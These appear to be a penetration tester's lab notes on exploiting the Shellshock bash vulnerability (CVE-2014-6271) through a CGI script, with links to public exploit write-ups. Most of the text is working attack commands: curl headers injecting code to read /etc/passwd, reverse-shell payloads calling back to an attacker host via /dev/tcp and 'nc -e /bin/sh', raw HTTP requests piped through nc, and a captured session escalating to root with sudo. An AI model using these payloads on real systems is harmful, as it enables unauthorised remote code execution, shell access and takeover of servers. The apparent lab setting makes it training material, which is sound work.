https://www.exploit-db.com/exploits/34766

https://blog.knapsy.com/blog/2014/10/07/basic-shellshock-exploitation/


https://pentesterlab.com/exercises/cve-2014-6271/course


Machines : shellshock, symfonos 3, sleepy

$ curl -s -H "x: () { :; }; /bin/bash -c 'cat /etc/passwd'" http://192.168.110.45/cgi-bin/status
$ curl -s -H "x: () { :; }; /bin/bash -c '; echo vulnerable'" http://192.168.110.45/cgi-bin/status

$ curl -s -H "x: () { :; }; /bin/bash -c 'ping -c 1 192.168.110.1 ; id'" http://192.168.110.45/cgi-bin/status
tcpdump -i eth0 -n icmp        


$ curl -s -H "x: () { :; }; /bin/bash -c 'ping -c 1 /dev/tcp/192.168.110.1/443 ; id'" http://192.168.110.45/cgi-bin/status
$ curl -s -H "x: () { :; }; /bin/bash -c '0<&21-;exec 21<>/dev/tcp/192.168.110.1/443;sh <&21 >&21 2>&21'" http://192.168.110.45/cgi-bin/status

```bash

echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc 192.168.110.45 80
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.110.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc 192.168.110.45 80

```

```bash
$ nc -lvp 443
id
uid=1000(pentesterlab) gid=50(staff) groups=50(staff),100(pentesterlab)
sudo -l
User pentesterlab may run the following commands on this host:
    (root) NOPASSWD: ALL
sudo -s
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)

env x='() { :;}; echo vulnerable' bash -c "echo test"
env x='() { :;}; cat /root/flag.txt' bash -c "echo test"
```

```bash

cat status
#!/bin/bash

echo "Content-Type: application/json";
echo ""
echo '{ "uptime": "'`uptime`'", "kernel": "'`uname -a`'"} '


```

This security vulnerability affects versions 1.14 (released in 1994) to the most recent version 4.3 according to NVD.

/bin/bash --version
GNU bash, version 4.2.45(1)-release (i686-pc-linux-gnu)